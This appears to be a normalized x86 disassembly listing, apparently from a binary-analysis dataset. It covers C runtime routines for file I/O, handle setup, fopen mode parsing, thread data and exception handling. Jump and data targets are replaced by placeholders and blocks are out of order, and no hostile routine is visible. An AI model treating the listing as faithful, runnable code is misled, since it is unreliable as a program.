push ecx
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
inc eax
inc [ ebp - 0x1ac8 ]
jmp r-xdata
inc edi
inc [ ebp - 0x1ad4 ]
mov edi [ ebp - 0x1ac8 ]
mov eax [ ebp - 0x1ae4 ]
add edi [ ebp - 0x1ad4 ]
cmp [ ebp - 0x1adc ] eax
jl r-xdata
xor ecx ecx
push ecx
push ecx
inc eax
inc [ ebp - 0x1ac8 ]
push 0x5
mov [ ebp - 0x1acc ] eax
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp - 0x1ac4 ]
push eax
push ecx
push [ ebp - 0x1af0 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x1ae4 ] eax
test eax eax
je r-xdata
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1adc ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov [ ebp - 0xc ] 0xd
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1adc ] 0x1
jl r-xdata
inc [ ebp - 0x1ad4 ]
inc edi
jmp r-xdata
sub_413b60
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_413ba6
pop ecx
test eax eax
je r-xdata
push esi
call sub_413c13
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_4121ca
push eax
call sub_417d59
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_413ba6
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov eax [ esi + 0xc ]
and al 0x3
cmp al 0x2
jne r-xdata
mov ecx [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] ecx
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test [ esi + 0xc ] 0x108
je r-xdata
push edi
mov edi [ esi ]
sub edi [ esi + 0x8 ]
test edi edi
jle r-xdata
pop edi
push edi
push [ esi + 0x8 ]
push esi
call sub_4121ca
pop ecx
push eax
call sub_413254
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_413c13
push 0x14
push r--data
call sub_411a70
xor edi edi
mov [ ebp - 0x1c ] edi
and [ ebp - 0x24 ] edi
push 0x1
call sub_41569d
pop ecx
and [ ebp - 0x4 ] edi
xor esi esi
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_413cee
cmp ebx 0x1
mov eax edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
call sub_411ab5
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_4118b8
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_413cbb
cmp ebx 0x1
jne r-xdata
test ebx ebx
jne r-xdata
push eax
call sub_413b60
pop ecx
cmp eax 0xffffffff
je r-xdata
test [ eax + 0xc ] 0x2
je r-xdata
inc edi
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
call sub_413b60
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_413cf7
push 0x10
push r--data
call sub_411a70
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_410e80
and [ eax ] 0x0
call sub_410eb4
mov [ eax ] 0x9
jmp r-xdata
call sub_410e80
and [ eax ] 0x0
call sub_410eb4
mov [ eax ] 0x9
call sub_41179e
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
push esi
call sub_417802
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_410eb4
mov [ eax ] 0x9
call sub_410e80
and [ eax ] 0x0
or edi 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_413dd9
add esp 0xc
mov edi eax
jmp r-xdata
call sub_411ab5
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_413db0
mov eax edi
jmp r-xdata
sub_413dd9
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_417ab9
pop ecx
cmp eax 0xffffffff
jne r-xdata
push ebx
push edi
push [ ebp + 0x10 ]
xor edi edi
push edi
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
call sub_410eb4
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
test edi edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
and esi 0x1f
mov eax [ eax * 4 + rw-data ]
shl esi 0x6
and [ eax + esi + 0x4 ] 0xfd
mov eax ebx
push edi
call sub_410e93
pop ecx
or eax 0xffffffff
jmp r-xdata
pop edi
pop ebx
sub_413e4b
push 0x18
push r--data
call sub_411a70
or esi 0xffffffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] esi
mov edi [ ebp + 0x8 ]
cmp edi 0xfffffffe
jne r-xdata
test edi edi
js r-xdata
call sub_410e80
and [ eax ] 0x0
call sub_410eb4
mov [ eax ] 0x9
jmp r-xdata
call sub_410e80
and [ eax ] 0x0
call sub_410eb4
mov [ eax ] 0x9
call sub_41179e
cmp edi [ rw-data ]
jae r-xdata
mov edx esi
mov eax edi
sar eax 0x5
mov [ ebp - 0x1c ] eax
mov ebx edi
and ebx 0x1f
shl ebx 0x6
mov eax [ eax * 4 + rw-data ]
movsx eax [ eax + ebx + 0x4 ]
and eax 0x1
je r-xdata
push edi
call sub_417802
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax * 4 + rw-data ]
test [ eax + ebx + 0x4 ] 0x1
je r-xdata
call sub_410eb4
mov [ eax ] 0x9
call sub_410e80
and [ eax ] 0x0
mov ebx esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_413f47
add esp 0x10
mov esi eax
mov ebx edx
jmp r-xdata
mov eax esi
call sub_411ab5
retn
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_413f1d
mov edx ebx
jmp r-xdata
sub_413f47
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_417ab9
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ SetFilePointerEx@IAT ]
test eax eax
jne r-xdata
call sub_410eb4
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
and esi 0x1f
mov eax [ eax * 4 + rw-data ]
shl esi 0x6
and [ eax + esi + 0x4 ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
push eax
call sub_410e93
pop ecx
jmp r-xdata
pop edi
pop esi
leave
retn
mov eax edi
mov edx edi
jmp r-xdata
sub_413fc0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_413feb
push 0x64
push r--data
call sub_411a70
push 0xb
call sub_41569d
pop ecx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x40
push 0x20
pop edi
push edi
call sub_411fca
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x24 ] ecx
test ecx ecx
jne r-xdata
mov [ rw-data ] eax
mov [ rw-data ] edi
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_411c70
add esp 0xc
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x74 ]
push eax
call [ GetStartupInfoW@IAT ]
cmp [ ebp - 0x42 ] 0x0
je r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
mov [ ecx + 0x8 ] ebx
and [ ecx + 0x24 ] 0x80
mov al [ ecx + 0x24 ]
and al 0x7f
mov [ ecx + 0x24 ] al
mov [ ecx + 0x25 ] 0xa0a
mov [ ecx + 0x38 ] ebx
mov [ ecx + 0x34 ] bl
add ecx 0x40
mov [ ebp - 0x24 ] ecx
mov eax [ rw-data ]
jmp r-xdata
call sub_411ab5
retn
mov [ ebp - 0x2c ] ebx
cmp ebx 0x3
jge r-xdata
mov eax [ ebp - 0x40 ]
test eax eax
je r-xdata
add eax 0x800
cmp ecx eax
jae r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_414290
xor eax eax
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov [ ebp - 0x24 ] esi
cmp [ esi ] 0xffffffff
je r-xdata
mov ecx [ eax ]
mov [ ebp - 0x1c ] ecx
add eax 0x4
mov [ ebp - 0x28 ] eax
add eax ecx
mov [ ebp - 0x20 ] eax
mov eax 0x800
cmp ecx eax
jl r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp [ esi ] 0xfffffffe
je r-xdata
xor esi esi
inc esi
mov [ ebp - 0x30 ] esi
mov ecx eax
mov [ ebp - 0x1c ] ecx
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
movsx eax [ esi + 0x4 ]
or al 0x80
mov [ esi + 0x4 ] al
jmp r-xdata
mov edi ebx
mov [ ebp - 0x2c ] edi
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x20 ]
push 0x40
push edi
call sub_411fca
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x24 ] ecx
test ecx ecx
jne r-xdata
movsx eax [ esi + 0x4 ]
or al 0x40
mov [ esi + 0x4 ] al
mov [ esi ] 0xfffffffe
mov eax [ rw-data ]
test eax eax
je r-xdata
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
jmp r-xdata
mov esi [ edx ]
cmp esi 0xffffffff
je r-xdata
mov [ esi * 4 + rw-data ] ecx
add [ rw-data ] edi
mov ecx [ rw-data ]
mov [ ebp - 0x1c ] ecx
mov eax [ eax + ebx * 4 ]
mov [ eax + 0x10 ] 0xfffffffe
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc edi
mov [ ebp - 0x2c ] edi
mov eax [ ebp - 0x28 ]
inc eax
mov [ ebp - 0x28 ] eax
add edx 0x4
mov [ ebp - 0x20 ] edx
jmp r-xdata
cmp esi 0xfffffffe
je r-xdata
inc esi
mov [ ebp - 0x30 ] esi
mov ecx [ ebp - 0x1c ]
jmp r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
mov [ ecx + 0x8 ] ebx
and [ ecx + 0x24 ] 0x80
mov [ ecx + 0x25 ] 0xa0a
mov [ ecx + 0x38 ] ebx
mov [ ecx + 0x34 ] bl
add ecx 0x40
mov [ ebp - 0x24 ] ecx
jmp r-xdata
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
cmp edi ecx
jge r-xdata
mov al [ eax ]
test al 0x1
je r-xdata
cmp [ rw-data ] ecx
jge r-xdata
mov eax [ esi * 4 + rw-data ]
add eax 0x800
cmp ecx eax
jae r-xdata
cmp eax 0x3
jne r-xdata
movsx eax [ esi + 0x4 ]
or al 0x40
jmp r-xdata
test al 0x8
jne r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
jmp r-xdata
movsx eax [ esi + 0x4 ]
or al 0x8
mov [ esi + 0x4 ] al
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x24 ] esi
mov eax [ edx ]
mov [ esi ] eax
mov eax [ ebp - 0x28 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
mov edx [ ebp - 0x20 ]
push esi
call [ GetFileType@IAT ]
mov edx [ ebp - 0x20 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x1c ]
sub_4142a0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
or eax 0x1
retn
test al al
je r-xdata
test al al
je r-xdata
add ecx 0x1
test al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
test ah ah
je r-xdata
test ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
test al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
test ah ah
jne r-xdata
mov edi edi
sub_41432c
push 0xc
push r--data
call sub_411a70
push 0xe
call sub_41569d
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_414394
call sub_411ab5
retn
mov ecx [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_40f691
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ ecx ] eax
jne r-xdata
mov edx ecx
jmp r-xdata
mov eax [ ecx + 0x4 ]
mov [ edx + 0x4 ] eax
push ecx
call sub_40f691
pop ecx
mov [ ebp - 0x1c ] ecx
test ecx ecx
je r-xdata
sub_41439d
push 0x10
push r--data
call sub_411a70
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_410e80
and [ eax ] 0x0
call sub_410eb4
mov [ eax ] 0x9
jmp r-xdata
call sub_410e80
and [ eax ] 0x0
call sub_410eb4
mov [ eax ] 0x9
call sub_41179e
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
push esi
call sub_417802
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_410eb4
mov [ eax ] 0x9
or edi 0xffffffff
push esi
call sub_414467
pop ecx
mov edi eax
jmp r-xdata
call sub_411ab5
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41443e
mov eax edi
jmp r-xdata
sub_414467
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_417ab9
pop ecx
cmp eax 0xffffffff
je r-xdata
xor esi esi
mov eax [ rw-data ]
cmp edi 0x1
jne r-xdata
xor eax eax
push esi
call sub_410e93
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp edi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push edi
call sub_417ab9
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_417ab9
push 0x1
mov esi eax
call sub_417ab9
pop ecx
pop ecx
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
jmp r-xdata
push edi
call sub_417a33
pop ecx
mov ecx edi
sar ecx 0x5
and edi 0x1f
mov ecx [ ecx * 4 + rw-data ]
shl edi 0x6
mov [ ecx + edi + 0x4 ] 0x0
test esi esi
je r-xdata
sub_414501
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test [ esi + 0xc ] 0x83
je r-xdata
pop esi
pop ebp
retn
test [ esi + 0xc ] 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_40f691
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_414531
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_4145f7
mov eax esi
pop esi
pop ebp
retn 0x4
sub_414571
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_41459f
mov eax esi
pop esi
pop ebp
retn 0x4
sub_41459f
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
call sub_414635
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
push [ edi + 0x4 ]
mov ecx esi
call sub_4145f7
jmp r-xdata
sub_4145d2
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_414635
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_40f691
pop ecx
sub_4145f7
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push ebx
mov ebx ecx
je r-xdata
pop ebx
pop ebp
retn 0x4
push edi
push [ ebp + 0x8 ]
call sub_416340
lea edi [ eax + 0x1 ]
push edi
call sub_40f6c9
pop ecx
pop ecx
mov [ ebx + 0x4 ] eax
test eax eax
je r-xdata
pop edi
push [ ebp + 0x8 ]
push edi
push eax
call sub_417ec6
add esp 0xc
mov [ ebx + 0x8 ] 0x1
sub_41465e
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x20
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
pop edi
pop esi
test eax eax
je r-xdata
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test [ eax ] 0x10
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov eax [ ecx ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0xc ] 0x1994000
sub_4146b9
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor edx edx
and [ ebp - 0x4 ] edx
push esi
mov esi [ ebp + 0xc ]
xor eax eax
push edi
mov edi [ rw-data ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
cmp al 0x61
je r-xdata
mov ebx 0x109
cmp al 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
mov [ ebp + 0xc ] 0x1000
xor ebx ebx
or edi 0x1
jmp r-xdata
cmp al 0x77
je r-xdata
inc esi
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
movsx eax al
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
mov al [ esi ]
test al al
je r-xdata
mov ebx 0x301
jmp r-xdata
call sub_410eb4
mov [ eax ] 0x16
call sub_41179e
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_41802e
add esp 0x14
test eax eax
jne r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or edi 0x2
pop edi
pop esi
pop ebx
leave
retn
xor eax eax
jmp r-xdata
inc [ rw-data ]
mov eax [ ebp + 0x14 ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x1c ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] ecx
cmp [ esi ] 0x20
je r-xdata
mov eax [ ebp + 0xc ]
test eax ebx
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
inc esi
push 0x3
push esi
push r--data
call sub_41804c
add esp 0xc
test eax eax
jne r-xdata
or ebx eax
xor ecx ecx
jmp r-xdata
test ebx 0xc000
jne r-xdata
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0x1
or ebx 0x20
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
sub eax 0xb
je r-xdata
push 0x20
add esi 0x3
pop eax
jmp r-xdata
test ecx ecx
je r-xdata
or ebx 0x8000
jmp r-xdata
test edx edx
jne r-xdata
sub eax 0xb
je r-xdata
test bl 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] al
je r-xdata
inc edx
or edi 0x4000
jmp r-xdata
test edx edx
jne r-xdata
sub eax 0x6
jne r-xdata
and ebx 0xfffffffe
and edi 0xfffffffc
or ebx 0x2
or edi 0x80
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
inc edx
and edi 0xffffbfff
jmp r-xdata
test ebx 0xc000
jne r-xdata
test bl 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] al
je r-xdata
or ebx 0x4000
jmp r-xdata
or ebx 0x40
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_418179
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] eax
jne r-xdata
push 0x8
push r--data
push esi
call sub_418179
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or ebx 0x40000
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
or ebx 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_418179
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
or ebx 0x20000
jmp r-xdata
add esi 0x7
or ebx 0x10000
jmp r-xdata
sub_414940
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_4149a8
push 0x8
push r--data
call sub_411a70
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_411ab5
retn 0x4
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ esi + 0x2c ] 0x0
je r-xdata
push [ esi + 0x24 ]
call sub_40f691
pop ecx
cmp [ esi + 0x34 ] 0x0
je r-xdata
push [ esi + 0x2c ]
call sub_40f691
pop ecx
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0x34 ]
call sub_40f691
pop ecx
cmp [ esi + 0x40 ] 0x0
je r-xdata
push [ esi + 0x3c ]
call sub_40f691
pop ecx
cmp [ esi + 0x44 ] 0x0
je r-xdata
push [ esi + 0x40 ]
call sub_40f691
pop ecx
cmp [ esi + 0x48 ] 0x0
je r-xdata
push [ esi + 0x44 ]
call sub_40f691
pop ecx
cmp [ esi + 0x5c ] r--data
je r-xdata
push [ esi + 0x48 ]
call sub_40f691
pop ecx
push 0xd
call sub_41569d
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push [ esi + 0x5c ]
call sub_40f691
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_414aca
push 0xc
call sub_41569d
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_414ad6
push esi
call sub_40f691
pop ecx
push edi
call sub_4172cb
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_40f691
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_417171
pop ecx
sub_414af7
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_415330
mov esi eax
pop ecx
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x3bc
push 0x1
call sub_411fca
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
call sub_41534f
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
call sub_40f691
pop ecx
xor esi esi
push 0x0
push esi
call sub_414b66
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_414b66
push 0x8
push r--data
call sub_411a70
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
push 0x43
pop eax
mov [ esi + 0xb8 ] ax
mov [ esi + 0x1be ] ax
mov [ esi + 0x68 ] rw-data
and [ esi + 0x3b8 ] 0x0
push 0xd
call sub_41569d
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_414c07
push 0xc
call sub_41569d
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_4170e1
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_414c10
call sub_411ab5
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_414c19
call sub_411127
call sub_4157cc
test eax eax
jne r-xdata
push sub_4149a8
call sub_4152f3
pop ecx
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call sub_414c8f
xor eax eax
retn
push esi
push 0x3bc
push 0x1
call sub_411fca
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
call sub_414c8f
xor eax eax
pop esi
retn
push esi
push [ rw-data ]
call sub_41534f
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x0
push esi
call sub_414b66
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
pop esi
retn
sub_414cac
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_4159b8
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
je r-xdata
sub_414cfb
push ebp
mov ebp esp
push esi
call sub_414af7
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov edx [ esi + 0x5c ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
lea eax [ edx + 0x90 ]
cmp ecx eax
jae r-xdata
add ecx 0xc
lea eax [ edx + 0x90 ]
